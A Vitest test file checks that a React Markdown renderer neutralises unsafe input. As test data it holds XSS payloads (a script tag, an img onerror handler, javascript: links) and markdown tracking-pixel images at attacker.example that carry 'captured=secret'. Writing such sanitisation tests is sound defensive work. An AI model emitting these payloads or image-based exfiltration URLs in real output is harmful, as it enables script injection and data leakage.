// @vitest-environment jsdom

import { act } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, describe, expect, it } from "vitest";

import { MarkdownProse } from "./Markdown";

(globalThis as typeof globalThis & { IS_REACT_ACT_ENVIRONMENT: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

const mounts: Array<{ root: ReturnType<typeof createRoot>; container: HTMLDivElement }> = [];

async function mountMarkdown(text: string): Promise<HTMLDivElement> {
  const container = document.createElement("div");
  document.body.appendChild(container);
  const root = createRoot(container);
  mounts.push({ root, container });
  await act(async () => root.render(<MarkdownProse text={text} />));
  return container;
}

afterEach(async () => {
  for (const mounted of mounts.splice(0)) {
    await act(async () => mounted.root.unmount());
    mounted.container.remove();
  }
});

describe("MarkdownProse", () => {
  it("renders headings, lists, emphasis, inline code, fenced code, and links", async () => {
    const container = await mountMarkdown(
      [
        "# Title",
        "",
        "Some **bold** and *italic* and `inline()` text.",
        "",
        "- first",
        "- second",
        "",
        "```py",
        "print('fenced')",
        "```",
        "",
        "[docs](https://example.test/docs)",
      ].join("\n"),
    );
    expect(container.querySelector("h1")?.textContent).toBe("Title");
    expect(container.querySelector("strong")?.textContent).toBe("bold");
    expect(container.querySelector("em")?.textContent).toBe("italic");
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.querySelector("p > code")?.textContent).toBe("inline()");
    expect(container.querySelector("pre code")?.textContent).toContain("print('fenced')");
    const link = container.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://example.test/docs");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("never passes raw HTML through: script/style/event-handler markup renders inert", async () => {
    const container = await mountMarkdown(
      'before <script>window.__markdown_pwned = true;</script> <img src="x" onerror="window.__markdown_pwned = true"> after',
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect((globalThis as unknown as Record<string, unknown>).__markdown_pwned).toBeUndefined();
    // Surrounding prose still renders.
    expect(container.textContent).toContain("before");
    expect(container.textContent).toContain("after");
  });

  it("strips javascript: URLs from markdown links", async () => {
    const container = await mountMarkdown("[click me](javascript:window.__markdown_pwned=true)");
    const link = container.querySelector("a");
    expect(link).not.toBeNull();
    expect(link?.getAttribute("href") ?? "").not.toContain("javascript:");
  });

  it("never renders images: markdown img emits no element that could fire a network request", async () => {
    // Captured traffic is attacker-controlled; an <img> would auto-request
    // the remote URL and exfiltrate data. The image renders as inert code.
    const container = await mountMarkdown("![tracking pixel](https://attacker.example/pixel?captured=secret)");
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelectorAll("[src]")).toHaveLength(0);
    // The URL stays visible as text so no information is lost.
    expect(container.querySelector("code.md-img")?.textContent).toContain("https://attacker.example/pixel?captured=secret");
    expect(container.querySelector("code.md-img")?.textContent).toContain("tracking pixel");
  });

  it("keeps the captured image URL and title visible as inert text — even for unsafe URLs", async () => {
    // NO-INFORMATION-LOSS: the unsafe URL and the title are captured
    // evidence. They must be SHOWN (as text) while never producing an
    // element that could fetch or execute anything.
    const container = await mountMarkdown('![tracking](javascript:alert%281%29 "captured title")');
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelectorAll("[src]")).toHaveLength(0);
    const inert = container.querySelector("code.md-img");
    expect(inert?.textContent).toContain("tracking");
    expect(inert?.textContent).toContain("javascript:alert%281%29");
    expect(inert?.textContent).toContain("captured title");
    expect((globalThis as unknown as Record<string, unknown>).__markdown_pwned).toBeUndefined();
  });

  it("keeps reference-definition and nested images inert with safe link attributes", async () => {
    const container = await mountMarkdown([
      "![tracking][pixel]",
      "",
      "[![nested][nested-pixel]](https://safe.example/docs \"reference link\")",
      "",
      "[nested-pixel]: https://attacker.example/nested.png \"nested title\"",
      "[pixel]: https://attacker.example/pixel.png \"captured title\"",
    ].join("\n"));
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelectorAll("[src]")).toHaveLength(0);
    const inert = container.querySelectorAll("code.md-img");
    expect(inert).toHaveLength(2);
    expect(inert[0].textContent).toContain("https://attacker.example/pixel.png");
    expect(inert[0].textContent).toContain("captured title");
    expect(inert[1].textContent).toContain("https://attacker.example/nested.png");
    expect(inert[1].textContent).toContain("nested title");
    const link = container.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://safe.example/docs");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
  });
});
